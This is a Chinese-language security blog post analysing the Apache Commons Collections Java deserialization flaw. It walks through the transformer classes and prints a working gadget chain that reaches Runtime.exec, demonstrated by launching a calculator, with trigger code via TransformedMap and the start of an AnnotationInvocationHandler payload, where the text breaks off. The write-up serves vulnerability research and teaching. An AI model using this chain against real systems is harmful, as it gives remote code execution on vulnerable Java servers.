<!doctype html><html lang=zh-hans><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="Liq3e"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-166034540-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=prev href=https://blog.usec.cc/posts/security/pentest/oauth-2.0-security/><link rel=next href=https://blog.usec.cc/posts/misc/hugo-github-pages/><link rel=canonical href=https://blog.usec.cc/posts/security/java/java-common-collections-deserialization/><link rel=icon type=image/png sizes=32x32 href=/favicon.ico><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>JAVA Common Collections 反序列化漏洞分析 | L33'</title><meta name=title content="JAVA Common Collections 反序列化漏洞分析 | L33'"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.usec.cc/"},"articleSection":"posts","name":"JAVA Common Collections 反序列化漏洞分析","headline":"JAVA Common Collections 反序列化漏洞分析","description":"引言 Common Collections库为JAVA提供了很多常用且强大的数据结构，在JAVA开发中使用较为广泛，该库的漏洞会导致极为广泛的安全问题。在漏洞曝出伊始，WebLogic、WebSphere、JBoss、Jenkins等基于JAVA开发的各种中间件及框架均受到影响。 本文对JAVA","inLanguage":"zh-Hans","author":"Liq3e","creator":"Liq3e","publisher":"Liq3e","accountablePerson":"Liq3e","copyrightHolder":"Liq3e","copyrightYear":"2018","datePublished":"2018-11-12T00:00:00+08:00","dateModified":"2018-11-12T00:00:00+08:00","url":"https://blog.usec.cc/posts/security/java/java-common-collections-deserialization/","wordCount":4628,"keywords":["java","deserialization","L33'"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">JAVA Common Collections 反序列化漏洞分析</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.usec.cc/ rel=author>Liq3e</a> with ♥
<span class=post-time>on <time datetime=2018-11-12 itemprop=datePublished>November 12, 2018</time></span>
in
<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.usec.cc/categories/security/>Security</a></span></div></header><div class=post-content><h2 id=引言>引言</h2><p>Common Collections库为JAVA提供了很多常用且强大的数据结构，在JAVA开发中使用较为广泛，该库的漏洞会导致极为广泛的安全问题。在漏洞曝出伊始，WebLogic、WebSphere、JBoss、Jenkins等基于JAVA开发的各种中间件及框架均受到影响。</p><p>本文对JAVA的Common Collections库的反序列化漏洞进行了分析，并进行了复现测试。</p><h2 id=测试环境>测试环境</h2><p>JAVA版本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ java -version
openjdk version <span style=color:#e6db74>&#34;1.8.0_151&#34;</span>
OpenJDK Runtime Environment <span style=color:#f92672>(</span>build 1.8.0_151-8u151-b12-0ubuntu0.17.04.2-b12<span style=color:#f92672>)</span>
OpenJDK 64-Bit Server VM <span style=color:#f92672>(</span>build 25.151-b12, mixed mode<span style=color:#f92672>)</span>
</code></pre></div><p>Common Collections库版本：<strong>3.3.2</strong></p><p>该版本中对不安全的类的序列化做出了限制，可以通过设置JAVA <em>VM options</em>来解除此限制：</p><pre><code>-Dorg.apache.commons.collections.enableUnsafeSerialization=true
</code></pre><h2 id=漏洞成因分析>漏洞成因分析</h2><p>Common Collections库中有许多常用的数据结构，这些数据结构能够通过关联<code>Transformer</code>类来利用其中自定义的<code>transform</code>函数在某些时机对数据做一些检查或修改。</p><p>Common Collections的各种反序列化漏洞的关键点有两个：</p><ul><li>利用<code>InvokerTransformer</code>、<code>ConstantTransformer</code>、<code>ChainedTransformer</code>等类构建恶意代码执行序列，这其中的代码执行需要利用<a href=https://www.sczyh30.com/posts/Java/java-reflection-1/>JAVA的反射机制</a>，并通过类中的<code>transform</code>方法调用。</li><li>寻找Common Collections中的类在反序列化时，会触发调用<code>transform</code>方法的情况，并以此来构建反序列化漏洞的payload。</li></ul><p>下文对上述两个关键点进行详细叙述。</p><h3 id=代码执行序列的构建>代码执行序列的构建</h3><h4 id=java中执行shell命令>JAVA中执行shell命令</h4><p>在JAVA中执行命令，一般的方式是利用<code>Runtime</code>类，比如执行计算器程序：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>)</span>
</code></pre></div><p>构建代码执行序列的目的就是达成上述的代码执行效果。</p><h4 id=invokertransformer类>InvokerTransformer类</h4><p>首先看<code>InvokerTransformer</code>类，下述代码含有该类的部分构造函数和<code>transform</code>函数：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>/**
</span><span style=color:#75715e> * Constructor that performs no validation.
</span><span style=color:#75715e> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param methodName  the method to call
</span><span style=color:#75715e> * @param paramTypes  the constructor parameter types, not cloned
</span><span style=color:#75715e> * @param args  the constructor arguments, not cloned
</span><span style=color:#75715e> */</span>
<span style=color:#66d9ef>public</span> <span style=color:#a6e22e>InvokerTransformer</span><span style=color:#f92672>(</span>String methodName<span style=color:#f92672>,</span> Class<span style=color:#f92672>[]</span> paramTypes<span style=color:#f92672>,</span> Object<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>super</span><span style=color:#f92672>();</span>
    iMethodName <span style=color:#f92672>=</span> methodName<span style=color:#f92672>;</span>                                                    
    iParamTypes <span style=color:#f92672>=</span> paramTypes<span style=color:#f92672>;</span>
    iArgs <span style=color:#f92672>=</span> args<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>

<span style=color:#75715e>/**
</span><span style=color:#75715e> * Transforms the input to result by invoking a method on the input.
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param input  the input object to transform
</span><span style=color:#75715e> * @return the transformed result, null if null input
</span><span style=color:#75715e> */</span>
<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>Object input<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>input <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span>
    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
        Class cls <span style=color:#f92672>=</span> input<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>();</span>
        Method method <span style=color:#f92672>=</span> cls<span style=color:#f92672>.</span><span style=color:#a6e22e>getMethod</span><span style=color:#f92672>(</span>iMethodName<span style=color:#f92672>,</span> iParamTypes<span style=color:#f92672>);</span>
        <span style=color:#66d9ef>return</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>input<span style=color:#f92672>,</span> iArgs<span style=color:#f92672>);</span>
            
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NoSuchMethodException ex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> iMethodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> input<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; does not exist&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IllegalAccessException ex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> iMethodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> input<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; cannot be accessed&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException ex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> iMethodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> input<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; threw an exception&#34;</span><span style=color:#f92672>,</span> ex<span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>由上述代码可以看出，<code>InvokerTransformer</code>类的<code>transform</code>函数中，利用反射机制进行了函数的调用；此外，利用反射机制进行调用时候的各个参数（<code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code>）皆可通过构造函数等进行自主赋值。</p><p>然而通过上述反射的方法，是无法一次就达成执行命令的效果的，<code>ChainedTransformer</code>类“应运而生”。</p><h4 id=chainedtransformer类>ChainedTransformer类</h4><p><code>ChainedTransformer</code>类是<code>Transformer</code>的子类，顾名思义，该类的构造函数可以接受一个<code>Transformer</code>对象数组，将一系列的<code>Transformer</code>对象链接起来，聚合成一个<code>Transformer</code>对象。</p><p>该类的部分源代码如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>/**
</span><span style=color:#75715e> * Constructor that performs no validation.
</span><span style=color:#75715e> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param transformers  the transformers to chain, not copied, no nulls
</span><span style=color:#75715e> */</span>
<span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ChainedTransformer</span><span style=color:#f92672>(</span>Transformer<span style=color:#f92672>[]</span> transformers<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>super</span><span style=color:#f92672>();</span>
    iTransformers <span style=color:#f92672>=</span> transformers<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>

<span style=color:#75715e>/**
</span><span style=color:#75715e> * Transforms the input to result via each decorated transformer
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param object  the input object passed to the first transformer
</span><span style=color:#75715e> * @return the transformed result
</span><span style=color:#75715e> */</span>
<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>Object object<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>                          
    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> iTransformers<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
        object <span style=color:#f92672>=</span> iTransformers<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>object<span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
    <span style=color:#66d9ef>return</span> object<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>其中<code>transform</code>函数的代码逻辑很简单，就是逐个调用<code>iTransformers</code>变量中的各<code>Transformer</code>对象的<code>transform</code>函数，并将当前<code>transform</code>函数的返回结果作为下一次调用的参数。</p><p>这样就可以组成一个调用链，来实现执行shell命令的代码逻辑。</p><p>但还有一个问题是，需要给最初的<code>InvokerTransformer</code>的<code>transform</code>函数的input参数传参。这个问题可以通过<code>ConstantTransformer</code>类来解决。</p><h4 id=constanttransformer类的transform函数>ConstantTransformer类的transform函数</h4><p><code>ConstantTransformer</code>类的<code>transform</code>函数逻辑十分简单，如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>/**
</span><span style=color:#75715e> * Transforms the input by ignoring it and returning the stored constant instead.
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param input  the input object which is ignored
</span><span style=color:#75715e> * @return the stored constant
</span><span style=color:#75715e> */</span>
<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>Object input<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>return</span> iConstant<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p><code>iConstant</code>为类构造函数的传入参数，如类名所示，该函数的作用就是将它直接返回。</p><h4 id=命令执行调用链>命令执行调用链</h4><p>综上所述，通过如下代码构造执行shell命令的调用链：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Transformer <span style=color:#a6e22e>generate_chain</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
            <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
            <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
            <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
            <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>})</span>
        <span style=color:#f92672>};</span>
    Transformer transformedChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>return</span> transformedChain<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>直接对该函数的返回值调用<code>transform(null)</code>方法，能够直接执行shell命令，弹出计算器。</p><p>至此，shell命令执行代码链构造完成。</p><h3 id=寻找反序列化时的触发点>寻找反序列化时的触发点</h3><p>下一步的任务是寻找对象在反序列化时，会调用<code>Transformer</code>类对象的<code>transform</code>函数的代码。</p><p>JAVA的序列化结果是以<code>ACED 0005</code>开头的二进制串，在反序列化的时候会调用对象的<code>readObject</code>函数，具体的JAVA反序列化的知识在此不再赘述。</p><p>寻找反序列化触发点的关键是：寻找在对象的<code>readObject</code>函数中能够直接或间接调用<code>transform</code>函数的情况。一般来说，不会有在<code>readObject</code>函数中直接调用<code>transform</code>函数的情形，需要寻找间接调用的情形（即在<code>readObject</code>函数所调用的函数中直接或间接调用了<code>transform</code>函数的情形）。</p><p>具体的方法可以是，从直接寻找调用了<code>transfrom</code>函数的方法开始，根据函数调用关系分析回溯，看是否能形成一个从<code>readObject</code>函数到<code>transform</code>函数的调用链条。</p><p>下文针对<code>TransformedMap</code>和<code>LazyMap</code>两个类中的反序列化漏洞触发情景进行分析和测试。</p><p>需要注意的是，如果使用Debug模式对程序进行分析调试，由于调试器会提前计算变量值，所以可能在程序执行到实际的漏洞触发代码前，shell指令就已经被执行。</p><h4 id=transformedmap-反序列化漏洞分析与测试>TransformedMap 反序列化漏洞分析与测试</h4><p>如上所述，接下来的目标是寻找在反序列化过程中能够调用<code>transform</code>的情境，以在反序列过程中执行构造好的命令执行链。</p><p><code>TransformedMap</code>中的<code>checkSetValue</code>函数调用了<code>transform</code>函数，其函数原型如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>/**
</span><span style=color:#75715e> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.
</span><span style=color:#75715e> * 
</span><span style=color:#75715e> * @param value  the value to transform
</span><span style=color:#75715e> * @return the transformed value
</span><span style=color:#75715e> * @since Commons Collections 3.1
</span><span style=color:#75715e> */</span> 
<span style=color:#66d9ef>protected</span> Object <span style=color:#a6e22e>checkSetValue</span><span style=color:#f92672>(</span>Object value<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>         
    <span style=color:#66d9ef>return</span> valueTransformer<span style=color:#f92672>.</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>value<span style=color:#f92672>);</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>从上述函数说明的注释中可以看出，在调用<code>setValue</code>函数时会调用此函数。具体地，<code>setValue</code>函数的实现在抽象类<code>AbstractInputCheckedMapDecorator</code>（即为<code>TransformedMap</code>类的父类）中，<code>setValue</code>函数实现如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span>Object value<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>  
    value <span style=color:#f92672>=</span> parent<span style=color:#f92672>.</span><span style=color:#a6e22e>checkSetValue</span><span style=color:#f92672>(</span>value<span style=color:#f92672>);</span>
    <span style=color:#66d9ef>return</span> entry<span style=color:#f92672>.</span><span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span>value<span style=color:#f92672>);</span>       
<span style=color:#f92672>}</span>
</code></pre></div><p>所以在<code>Transformed</code>类的<code>setValue</code>方法被调用时，即可触发命令执行，弹出计算器。如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>})</span>
<span style=color:#f92672>};</span>
Transformer transformedChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>


Map normalMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
normalMap<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;key&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;value&#34;</span><span style=color:#f92672>);</span>

Map transformedMap <span style=color:#f92672>=</span> TransformedMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>normalMap<span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> transformedChain<span style=color:#f92672>);</span>


Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span> entry <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span><span style=color:#f92672>)</span> transformedMap<span style=color:#f92672>.</span><span style=color:#a6e22e>entrySet</span><span style=color:#f92672>().</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>().</span><span style=color:#a6e22e>next</span><span style=color:#f92672>();</span>
entry<span style=color:#f92672>.</span><span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;test&#34;</span><span style=color:#f92672>);</span>
</code></pre></div><p>反序列化漏洞触发的另一个重要的类是<code>AnnotationInvocationHandler</code>类，在网上的其他资料中，显示此类的<code>readObject</code>函数中调用了<code>setValue</code>函数。利用反射机制生成序列化结果的payload，对该序列化结果进行反序列化即可触发命令执行。生成payload的代码如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>})</span>
<span style=color:#f92672>};</span>
Transformer transformedChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>


Map normalMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
normalMap<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;key&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;value&#34;</span><span style=color:#f92672>);</span>

Map transformedMap <span style=color:#f92672>=</span> TransformedMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>normalMap<span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> transformedChain<span style=color:#f92672>);</span>


Class cls <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
